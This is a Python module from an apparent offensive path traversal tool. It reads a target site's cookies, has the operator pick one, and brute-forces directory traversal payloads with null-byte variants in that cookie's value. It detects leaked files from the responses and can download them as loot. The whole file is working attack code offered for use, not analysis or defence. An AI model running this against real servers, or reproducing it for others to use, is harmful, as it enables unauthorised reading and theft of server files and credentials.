#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

from core.methods.session import session
from http.cookies import SimpleCookie
import requests, sys
from core.colors import color
from core.variables import payloadlist, nullchars
from core.methods.filecheck import filecheck
from core.methods.loot import download



def getCookie(url):
    s = session()
    r = s.get(url)
    return s.cookies

def readCookie(url):
    #cookiestring = ""
    #with open(cookiefile, "r") as f:
    #    cookiestring = f.read().strip()
    #assert cookiestring != ""
    #scookie = SimpleCookie()
    #scookie.load(cookiestring)
    #make it compatible with requests
    cookie = getCookie(url)
    #for key, morsel in scookie.items():
    #    cookie[key] = morsel.value
    i = 0
    if len(cookie.keys()) < 1:
        sys.exit(color.R + "[-]" + color.END + " Server did not send any cookies.")
    for key in cookie.keys():
        print(str(i) + ": " + key)
        i += 1
    selected = input("\n[!] Select key for attack (int) :> ")
    selectedpart = list(cookie.keys())[int(selected)]
    #print(selectedpart)
    return (cookie, selectedpart)

def determine_payloads_cookie(url, cookie, selected ,verbose, depth, paylist, file):
    s = session()
    payloads = []
    nullbytes = []
    s.cookies = cookie
    con2 = s.get(url).content
    for i in paylist:
        d = 0
        while d <= depth:
            traverse=''
            j=1
            while j <= d:
                traverse+=i
                j+=1
            requestlist = []
            s.cookies.set(selected, traverse + file)
            p = traverse + file
            r = s.get(url)
            requestlist.append((r, p, ""))
            for nb in nullchars:
                s.cookies.set(selected, traverse + file + nb)
                p = traverse + file + nb
                r = s.get(url)
                requestlist.append((r, p, nb))
            found = False
            for (r, p, nb) in requestlist:
                if str(r.status_code).startswith("2") or r.status_code == 302 or r.status_code == 403:
                    if filecheck(r.content, con2, p):
                        payloads.append(i)
                        if nb != "":
                            nullbytes.append(nb)
                        found = True
                        print(color.RD + "[pl]" + color.END + color.O + " " + str(r.status_code) + color.END + " " + i)
            d+=1
            if found:
                break
    
    return (payloads, nullbytes)

def cookie_attack(url, cookie, selected, files, dirs, depth, verbose, dl, summary, selected_payloads, selected_nullbytes):
    s = session()
    found=[]
    urls = []
    con2 = s.get(url).content
    for dir in dirs:
        for file in files:
            d=1
            while d <= depth:
                for i in selected_payloads:
                    traverse=''
                    j=1
                    while j <= d:
                        traverse+=i
                        j+=1
                    requestlist = []
                    if selected_nullbytes == []:
                        val1 = traverse + dir + file
                        #s.cookies.clear()
                        s.cookies.set(selected, traverse + dir + file)
                        r = s.get(url)
                        requestlist.append((r, val1))
                    else:
                        for nb in selected_nullbytes:
                            val2 = traverse + dir + file + nb
                            #s.cookies.clear()
                            s.cookies.set(selected, traverse + dir + file + nb)
                            r = s.get(url)
                            requestlist.append((r, val2))
                    for (r, val) in requestlist:
                        #s.cookies.clear()
                        s.cookies.set(selected, val)
                        if str(r.status_code).startswith("2") or r.status_code == 302:
                            if filecheck(r.content, con2, val):
                                print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+val)
                                if dl and dir+file not in found:
                                    download(r.url,dir+file,cookie=s.cookies)
                                found.append(dir+file)
                                urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + val)
                        elif r.status_code == 403:
                            print(color.RD+"[INFO]"+color.O+" leak"+color.END+"       "+color.RD+"statvs-code"+color.END+"="+color.O+str(r.status_code)+color.END+" "+color.R+"cookie"+color.END+"="+val)
                            found.append(dir+file)
                            urls.append(color.RD + "[pl]" + color.END + color.O + " " +  str(r.status_code) + color.END + " " + val)
                        else:
                            if verbose:
                                print(color.RD+"{}|: ".format(r.status_code)+color.END+color.RC+val+color.END)
                d+=1
    return (found, urls)